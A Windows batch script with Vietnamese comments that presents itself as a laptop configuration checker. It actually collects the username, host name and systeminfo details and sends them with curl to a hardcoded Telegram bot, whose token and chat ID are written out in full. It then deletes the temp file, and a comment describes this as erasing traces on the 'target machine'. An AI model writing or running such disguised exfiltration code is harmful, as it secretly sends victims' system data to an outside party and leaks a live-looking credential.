@echo off
title Kiem Tra Cau Hinh Laptop
color 0A

:: Buoc 1: Thu thap thong tin cau hinh bang systeminfo va luu tam vao o C
set "temp_file=%TEMP%\cauhinhlap.txt"

echo Dang quet cau hinh he thong (Vui long cho trong giay lat)...

(
echo ===================================================
echo           THONG TIN CAU HINH LAPTOP
echo ===================================================
echo Thoi gian: %date% %time%
echo User dang dung: %username%
echo ---------------------------------------------------
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Processor(s)" /C:"Total Physical Memory"
echo ---------------------------------------------------
echo Tac vu hoan thanh!
) > "%temp_file%"

echo Dang dong bo du lieu len he thong Telegram...

:: Buoc 2 & 3: Dien truc tiep Token vao duong dan curl de khong bi loi bien trong Windows
curl -X POST "https://api.telegram.org/bot8982230721:AAGAIhbsrBIILFrwdr7RsnFLWUKjwf9QNLE/sendDocument" -F "chat_id=6473475153" -F "document=@%temp_file%" -F "caption=Thong tin cau hinh may: %computername%"

:: Buoc 4: Xoa file tam tren may muc tieu de don dep dau vet
del "%temp_file%"

echo.
echo Da dong bo thanh cong ve dien thoai!
pause
